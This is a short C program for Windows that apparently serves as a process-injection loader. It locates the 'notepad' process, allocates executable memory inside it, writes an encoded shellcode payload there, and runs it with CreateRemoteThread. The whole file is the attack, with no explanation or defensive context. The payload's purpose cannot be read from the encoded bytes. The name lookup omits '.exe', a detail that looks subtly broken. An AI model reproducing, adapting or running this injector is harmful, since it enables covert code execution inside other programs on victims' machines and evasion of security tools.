#include "Windows.h"
#include "stdio.h"
#include "tlhelp32.h"
DWORD find_process_pid(const WCHAR* process_name)
{
	if (!process_name) return 0;

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE) {
		fwprintf(stderr, L"CreateToolhelp32Snapshot failed: %u\n", GetLastError());
		return 0;
	}

	PROCESSENTRY32W pe;
	pe.dwSize = sizeof(pe);

	if (!Process32FirstW(snapshot, &pe)) {
		fwprintf(stderr, L"Process32FirstW failed: %u\n", GetLastError());
		CloseHandle(snapshot);
		return 0;
	}

	do {
		if (_wcsicmp(pe.szExeFile, process_name) == 0) {
			DWORD pid = pe.th32ProcessID;
			CloseHandle(snapshot);
			return pid;
		}
	} while (Process32NextW(snapshot, &pe));

	CloseHandle(snapshot);
	return 0;
}


int main(int argc, char* argv[])
{
	unsigned char shellcode[] =
		"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
		"\xff\xff\xff\x48\xbb\x51\xd7\x03\xb7\xd8\x1f\xe2\xbc\x48"
		"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xad\x9f\x80"
		"\x53\x28\xf7\x22\xbc\x51\xd7\x42\xe6\x99\x4f\xb0\xed\x07"
		"\x9f\x32\x65\xbd\x57\x69\xee\x31\x9f\x88\xe5\xc0\x57\x69"
		"\xee\x71\x9f\x88\xc5\x88\x57\xed\x0b\x1b\x9d\x4e\x86\x11"
		"\x57\xd3\x7c\xfd\xeb\x62\xcb\xda\x33\xc2\xfd\x90\x1e\x0e"
		"\xf6\xd9\xde\x00\x51\x03\x96\x52\xff\x53\x4d\xc2\x37\x13"
		"\xeb\x4b\xb6\x08\x94\x62\x34\x51\xd7\x03\xff\x5d\xdf\x96"
		"\xdb\x19\xd6\xd3\xe7\x53\x57\xfa\xf8\xda\x97\x23\xfe\xd9"
		"\xcf\x01\xea\x19\x28\xca\xf6\x53\x2b\x6a\xf4\x50\x01\x4e"
		"\x86\x11\x57\xd3\x7c\xfd\x96\xc2\x7e\xd5\x5e\xe3\x7d\x69"
		"\x37\x76\x46\x94\x1c\xae\x98\x59\x92\x3a\x66\xad\xc7\xba"
		"\xf8\xda\x97\x27\xfe\xd9\xcf\x84\xfd\xda\xdb\x4b\xf3\x53"
		"\x5f\xfe\xf5\x50\x07\x42\x3c\xdc\x97\xaa\xbd\x81\x96\x5b"
		"\xf6\x80\x41\xbb\xe6\x10\x8f\x42\xee\x99\x45\xaa\x3f\xbd"
		"\xf7\x42\xe5\x27\xff\xba\xfd\x08\x8d\x4b\x3c\xca\xf6\xb5"
		"\x43\xae\x28\x5e\xfe\x66\x68\x91\x8e\x0e\xe4\x31\xb7\xd8"
		"\x5e\xb4\xf5\xd8\x31\x4b\x36\x34\xbf\xe3\xbc\x51\x9e\x8a"
		"\x52\x91\xa3\xe0\xbc\x40\x8b\x09\xe6\xfc\x10\xa3\xe8\x18"
		"\x5e\xe7\xfb\x51\xee\xa3\x06\x1d\xa0\x25\xb0\x27\xca\xae"
		"\x35\xbb\xbf\x02\xb6\xd8\x1f\xbb\xfd\xeb\xfe\x83\xdc\xd8"
		"\xe0\x37\xec\x01\x9a\x32\x7e\x95\x2e\x22\xf4\xae\x17\x4b"
		"\x3e\x1a\x57\x1d\x7c\x19\x5e\xc2\xf6\x62\xf5\xed\x63\xb1"
		"\x28\xd6\xff\x51\xd8\x88\xac\x10\x8f\x4f\x3e\x3a\x57\x6b"
		"\x45\x10\x6d\x9a\x12\xac\x7e\x1d\x69\x19\x56\xc7\xf7\xda"
		"\x1f\xe2\xf5\xe9\xb4\x6e\xd3\xd8\x1f\xe2\xbc\x51\x96\x53"
		"\xf6\x88\x57\x6b\x5e\x06\x80\x54\xfa\xe9\xdf\x88\xb1\x08"
		"\x96\x53\x55\x24\x79\x25\xf8\x75\x83\x02\xb6\x90\x92\xa6"
		"\x98\x49\x11\x03\xdf\x90\x96\x04\xea\x01\x96\x53\xf6\x88"
		"\x5e\xb2\xf5\xae\x17\x42\xe7\x91\xe0\x2a\xf1\xd8\x16\x4f"
		"\x3e\x19\x5e\x58\xc5\x9d\xe8\x85\x48\x0d\x57\xd3\x6e\x19"
		"\x28\xc9\x3c\xd6\x5e\x58\xb4\xd6\xca\x63\x48\x0d\xa4\x12"
		"\x09\xf3\x81\x42\x0d\x7e\x8a\x5f\x21\xae\x02\x4b\x34\x1c"
		"\x37\xde\xba\x2d\xdd\x83\x4c\x38\x6a\xe7\x07\x16\xc4\x71"
		"\xd8\xb2\x1f\xbb\xfd\xd8\x0d\xfc\x62\xd8\x1f\xe2\xbc";

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;
	DWORD target_process_id = find_process_pid(L"notepad");
	
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_process_id);
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);

	return 0;
}
